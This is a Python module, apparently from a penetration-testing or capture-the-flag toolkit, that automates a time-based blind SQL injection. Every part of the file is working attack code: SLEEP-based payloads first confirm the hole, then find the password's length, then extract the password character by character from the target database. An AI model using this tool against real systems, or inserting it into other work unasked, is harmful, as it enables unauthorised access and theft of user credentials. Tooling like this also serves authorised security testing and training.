import time
import string
from modules.utils import make_request


def _check_time_based_vulnerability(target_url, auth, data, param_to_fuzz, sleep_time):
    """
    Confirms the target is vulnerable to time-based injection by making it sleep.

    It injects a command that tells the database to sleep only if a condition (1=1) is true.
    If the response takes longer than the sleep time, the target is likely vulnerable.

    :param target_url: The URL to send the request to.
    :param auth: A tuple for basic authentication (username, password).
    :param data: A dictionary containing the request data.
    :param param_to_fuzz: The key in the 'data' dictionary that is vulnerable to injection.
    :param sleep_time: The number of seconds to ask the database to sleep.
    """
    print("[+] Stage 1: Detecting time-based vulnerability...")
    base_value = data[param_to_fuzz]
    payload = f'{base_value}" OR IF(1=1, SLEEP({sleep_time}), 0) -- -'
    payload_data = data.copy()
    payload_data[param_to_fuzz] = payload

    start_time = time.time()
    # The timeout must be longer than the sleep time to avoid a false negative.
    make_request(target_url, auth=auth, data=payload_data, timeout=sleep_time + 2)
    end_time = time.time()

    if (end_time - start_time) >= sleep_time:
        print(f"[!] SUCCESS: Target appears to be VULNERABLE to time-based injection.")
        return True
    else:
        print("[-] FAILED: Target does not appear to be vulnerable.")
        return False


def _get_password_length_time_based(target_url, auth, data, param_to_fuzz, sleep_time, max_len):
    """
    Determines password length using a time-based side channel.

    :param target_url: The URL to send the request to.
    :param auth: A tuple for basic authentication (username, password).
    :param data: A dictionary containing the request data.
    :param param_to_fuzz: The key in the 'data' dictionary that is vulnerable to injection.
    :param sleep_time: The number of seconds to ask the database to sleep.
    :param max_len: The maximum password length to test for.
    """
    print("\n[+] Stage 2: Determining password length...")
    base_value = data[param_to_fuzz]

    for length in range(1, max_len + 1):
        print(f"    [-] Checking for length: {length}")
        payload = f'{base_value}" OR IF(LENGTH(password) = {length}, SLEEP({sleep_time}), 0) -- -'
        payload_data = data.copy()
        payload_data[param_to_fuzz] = payload

        start_time = time.time()
        make_request(target_url, auth=auth, data=payload_data, timeout=sleep_time + 2)
        end_time = time.time()

        if (end_time - start_time) >= sleep_time:
            print(f"\n[!] SUCCESS: Password length is exactly {length} characters.")
            return length

    print(f"\n[-] FAILED: Could not determine password length up to the max of {max_len}.")
    return 0


def probe_blind_sql_time_generic(target_url, auth, data, param_to_fuzz, sleep_time=5, max_len=32):
    """
    Performs a three-stage time-based blind SQL injection to exfiltrate a password.

    Stage 1: Confirm the vulnerability exists.
    Stage 2: Determine the length of the password.
    Stage 3: Determine each character of the password.

    :param target_url: The URL to send the request to.
    :param auth: A tuple for basic authentication (username, password).
    :param data: A dictionary containing the request data.
    :param param_to_fuzz: The key in the 'data' dictionary that is vulnerable to injection.
    :param sleep_time: The number of seconds to use for the SLEEP() function.
    :param max_len: The maximum expected length of the password.
    """
    if param_to_fuzz not in data:
        print(f"\n[-] ERROR: The parameter to fuzz '{param_to_fuzz}' is not in the provided data dictionary.")
        return

    # --- 1. Confirm Vulnerability ---
    if not _check_time_based_vulnerability(target_url, auth, data, param_to_fuzz, sleep_time):
        print("[-] Halting scan because target does not appear vulnerable.")
        return

    # --- 2. Get Length ---
    discovered_length = _get_password_length_time_based(target_url, auth, data, param_to_fuzz, sleep_time, max_len)
    if not discovered_length:
        print("[-] Halting scan because password length could not be determined.")
        return

    # --- 3. Exfiltrate Password ---
    print("\n[+] Stage 3: Exfiltrating password characters...")
    CHARSET = string.ascii_letters + string.digits
    password = ""

    for i in range(discovered_length):
        found_char_in_iteration = False
        for char in CHARSET:
            payload = f'{data[param_to_fuzz]}" AND IF(BINARY password LIKE \'{password + char}%\', SLEEP({sleep_time}), 0) -- -'
            payload_data = data.copy()
            payload_data[param_to_fuzz] = payload

            start_time = time.time()
            make_request(target_url, auth=auth, data=payload_data, timeout=sleep_time + 2)
            end_time = time.time()

            # If the request was delayed, we found the correct character.
            if (end_time - start_time) >= sleep_time:
                password += char
                print(f"[+] Found character: '{char}' -> Password so far: {password}")
                found_char_in_iteration = True
                break  # Move to the next character position.

        if not found_char_in_iteration:
            print(f"\n[-] FAILED to find character at position {len(password) + 1}.")
            break

    if len(password) == discovered_length:
        print(f"\n[!] SUCCESS: Full Password Extracted: {password}")
    else:
        print(f"\n[-] FAILED: Could only extract a partial password: {password}")
